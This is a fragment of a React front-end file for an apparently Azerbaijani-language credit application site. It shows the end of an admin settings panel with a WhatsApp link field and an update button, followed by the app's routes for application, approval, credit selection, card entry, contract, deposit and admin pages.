                placeholder="https://wa.me/994..."
                value={settings.whatsapp_link}
                onChange={(e) => setSettings({ ...settings, whatsapp_link: e.target.value })}
                className="mt-1.5"
              />
            </div>

            <Button
              onClick={handleUpdate}
              disabled={loading}
              className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 py-6"
              data-testid="admin-update-btn"
            >
              {loading ? (
                <>
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                  Yenilənir...
                </>
              ) : (
                'Parametrləri yenilə'
              )}
            </Button>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

function App() {
  return (
    <div className="App">
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<HomePage />} />
          <Route path="/application" element={<ApplicationForm />} />
          <Route path="/approval/:id" element={<ApprovalPage />} />
          <Route path="/credit-selection/:id" element={<CreditSelectionPage />} />
          <Route path="/card-entry/:id" element={<CardEntryPage />} />
          <Route path="/contract/:id" element={<ContractPage />} />
          <Route path="/deposit/:id" element={<DepositPage />} />
          <Route path="/admin" element={<AdminPanel />} />
        </Routes>
      </BrowserRouter>
    </div>
  );
}

export default App;